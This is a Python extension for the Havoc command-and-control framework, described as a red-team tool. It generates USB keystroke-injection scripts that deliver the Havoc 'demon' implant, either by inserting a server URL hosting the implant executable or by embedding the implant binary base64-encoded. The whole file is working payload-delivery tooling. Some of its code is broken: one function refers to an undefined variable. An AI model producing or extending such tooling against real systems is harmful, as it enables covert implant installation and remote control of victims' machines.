#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Sat 03 Feb 2024 06:04:14 PM CET
# ducky.py
# Description:
#  A havoc extension to generate ducky script payloads for havoc on red team
#  engagements.

import webbrowser
import havoc, havocui
import os, json, base64

ducky_current_dir = os.getcwd()
ducky_install_path = "/data/extensions/havoc-ducky/"

while not os.path.exists(ducky_current_dir + ducky_install_path):
    # not installed through havoc-store so prompt for the path
    ducky_current_dir = ""
    ducky_install_path = havocui.inputdialog("Install path", "Please enter your install path here for the module to work correctly:")

# Global variables
ducky_settings = {
    "bin_file_path": "demon.x64.bin",
    "server_url_bin": "http://localhost:8080/demon.x64.exe",
    "payload_folder": os.path.join(ducky_current_dir, ducky_install_path, "payloads/")
}
ducky_config_path = ducky_current_dir + ducky_install_path + "settings.json"
ducky_payload = ""
ducky_settings_pane = havocui.Widget("Ducky Settings", True)
ducky_payload_list = None
ducky_payload_array = []

# save the settings
def save_ducky_settings():
    global ducky_settings
    global ducky_config_path
    with open(ducky_config_path, "w") as fp:
        # save the config
        json.dump(ducky_settings, fp)
    if os.path.exists(ducky_settings["payload_folder"]):
        ducky_payload_array = [file for file in os.listdir(ducky_settings["payload_folder"]) if os.path.isfile(os.path.join(ducky_settings["payload_folder"], file))]
        ducky_payload_list.addRow("Ducky Scripts", *files)

def select_payload_ducky(data):
    global ducky_settings
    global ducky_payload
    global ducky_payload_array
    global ducky_payload_list

    if os.path.exists(ducky_settings["payload_folder"] + data):
        ducky_payload = data
        with open(ducky_settings["payload_folder"] + data, "r") as fp:
            data = fp.read()
            ducky_payload_list.setPanel(data.replace('\n', "<br />"))
ducky_payload_list = havocui.Tree("Ducky Payloads", select_payload_ducky, True)
def open_ducky_list():
    ducky_payload_list.setBottomTab()

# Function for settings
def change_ducky_bin_path():
    global ducky_settings

    new_path = havocui.openfiledialog("select file").decode('ascii')
    old_path = ""
    if os.path.exists(ducky_settings["bin_file_path"]):
        old_path = "<span style='color:#00ff00'>%s</span>" % ducky_settings["bin_file_path"]
    else:
        old_path = "<span style='color:#ff6347'>%s</span>" % ducky_settings["bin_file_path"]
    ducky_settings_pane.replaceLabel(old_path, "<span style='color:#ffa07a'>%s</span>" % new_path)
    ducky_settings["bin_file_path"] = new_path
def change_ducky_payload_folder(path):
    global ducky_settings
    ducky_settings["payload_folder"] = path
def get_domain_ducky(url):
    global ducky_settings
    ducky_settings["server_url_bin"] = url
# Display the settings
def open_ducky_setting():
    global ducky_settings

    ducky_settings_pane.clear()
    ducky_settings_pane.addLabel("<h3 style='color:#bd93f9'>Ducky Settings:</h3>")
    ducky_settings_pane.addLabel("<span style='color:#71e0cb'>Havoc Binary Payload:</span>")
    if os.path.exists(ducky_settings["bin_file_path"]):
        ducky_settings_pane.addLabel("<span style='color:#00ff00'>%s</span>" % ducky_settings["bin_file_path"])
    else:
        ducky_settings_pane.addLabel("<span style='color:#ff6347'>%s</span>" % ducky_settings["bin_file_path"])
    ducky_settings_pane.addButton("Change", change_ducky_bin_path)
    ducky_settings_pane.addLabel("<span style='color:#71e0cb'>Server Payload Host:</span>")
    ducky_settings_pane.addLineedit(ducky_settings["server_url_bin"], get_domain_ducky)
    ducky_settings_pane.addLabel("<span style='color:#71e0cb'>Ducky Payload Folder:</span>")
    ducky_settings_pane.addLineedit(ducky_settings["payload_folder"], change_ducky_payload_folder)
    ducky_settings_pane.addButton("Save", save_ducky_settings)
    ducky_settings_pane.setSmallTab()

def ducky_generate():
    global ducky_settings
    global ducky_payload
    print("here")
    print(ducky_settings["payload_folder"] + ducky_payload)

    if os.path.exists(ducky_settings["payload_folder"] + ducky_payload):
        save_path = havocui.savefiledialog("save script")
        content = ""
        with open(ducky_settings["payload_folder"] + ducky_payload, 'r') as fp:
            content = fp.read()
        if "{DUCKY_REMOTE_URL}" in content:
            content = content.replace("{DUCKY_REMOTE_URL}", ducky_settings["server_url_bin"])
        if "{DUCKY_BASE64_PAYLOAD}" in content and os.path.exists(ducky_settings["bin_file_path"]):
            bin_data = ""
            with open(ducky_settings["bin_file_path"], "rb") as fp:
                bin_data = fp.read()
            content = content.replace("{DUCKY_BASE64_PAYLOAD}", base64.b64encode(bin_data).decode('utf-8'))
        with open(save_path, "w") as fp:
            fp.write(content)

def open_ducky_help():
    webbrowser.open('https://github.com/p4p1/havoc-ducky')

# Handle the settings of the tool load / save
if os.path.exists(ducky_config_path):
    # find the settings path
    with open(ducky_config_path, "r") as fp:
        # load the settings
        ducky_settings = json.load(fp)
else:
    save_ducky_settings()

if os.path.exists(ducky_settings["payload_folder"]):
    ducky_payload_array = [file for file in os.listdir(ducky_settings["payload_folder"]) if os.path.isfile(os.path.join(ducky_settings["payload_folder"], file))]
    ducky_payload_list.addRow("Ducky Scripts", *ducky_payload_array)

havocui.createtab("Ducky", "Generate", ducky_generate, "Payload list", open_ducky_list, "Settings", open_ducky_setting, "Help / Syntax", open_ducky_help)
